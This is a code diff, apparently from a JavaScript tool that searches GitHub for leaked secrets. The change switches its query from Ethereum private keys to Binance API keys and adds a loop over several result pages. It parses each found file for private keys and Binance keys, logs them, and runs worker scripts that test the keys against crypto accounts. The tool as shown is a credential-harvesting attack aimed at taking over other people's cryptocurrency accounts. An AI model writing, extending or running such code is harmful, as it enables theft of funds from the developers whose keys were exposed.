@@ -494,22 +494,30 @@ const start =  async () => {
  const filePromiseChain = () => {
   
 }  
- const query = 'web3 PRIVATE_KEY='
+ const query = 'BINANCE_API_KEY'
  initGithubAccounts().then(accounts => {
 
    const ghAccount = accounts[0].ghAccount
-   collectFiles(query, ghAccount, 1).then(res => {
+   for(let i = 0; i <= 6; i++) {
+    collectFiles(query, ghAccount, i).then(res => {
     return Promise.each(res, async file => {
      const parser = await spawn(new Worker("./workers/parseFile"))
      const result = await parser(file.content)
      const privateKeys = result.privateKeys
      console.log("got private keys", privateKeys)
+     console.log("got binance keys", result.binanceKeys)
+
      if(privateKeys.length > 0) {
         const privateKeyTester = await spawn(new Worker("./workers/testPrivateKeys.js"))
         const cryptoAccounts = await privateKeyTester(privateKeys)
         console.log("cryptoaccounts", cryptoAccounts)
     }
+    if(result.binanceKeys.length > 0) {
+     const binanceKeyTester = await spawn(new Worker("./workers/testBinanceKeys.js"))
+     const results = await binanceKeyTester(result.binanceKeys)
+     console.log(results)
+    }
    })
-  })
+  })}
  })
 
